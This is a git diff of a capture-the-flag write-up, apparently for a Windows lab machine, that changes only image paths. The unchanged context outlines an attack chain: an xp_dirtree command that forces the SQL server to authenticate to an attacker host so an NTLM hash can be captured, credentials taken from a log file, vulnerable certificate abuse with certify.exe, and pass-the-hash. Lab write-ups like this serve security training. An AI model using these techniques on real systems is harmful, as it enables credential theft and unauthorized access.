@@ -112,7 +112,7 @@ EXEC xp_dirtree '\\10.10.14.7\share'
 
 Afterwards, we would capture an NTLM hash.
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can try to crack this hash via whatever method available to find this password:
 
@@ -137,7 +137,7 @@ This user did not have the flag or any other local privileges. However, since we
 
 Within the `C:\SQLServer\Logs` file, we can find an ERRORLOG file:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Within that file, we can find some credentials:
 
@@ -156,11 +156,11 @@ We can grab the user flag now.
 
 I ran a winPEAS scan to enumerate for me. This scan found some certificates on the machine that could potentially be the PE vector.
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can use `certify.exe` to find out if this is vulnerable. Using `certify.exe find /vulnerable`, we can find one certificate:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 We can then request for this certificate using this command:
 
@@ -188,4 +188,4 @@ Now that we have confirmed this works, we can append `/getcredentials` to the en
 
 Then, just pass the hash!
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
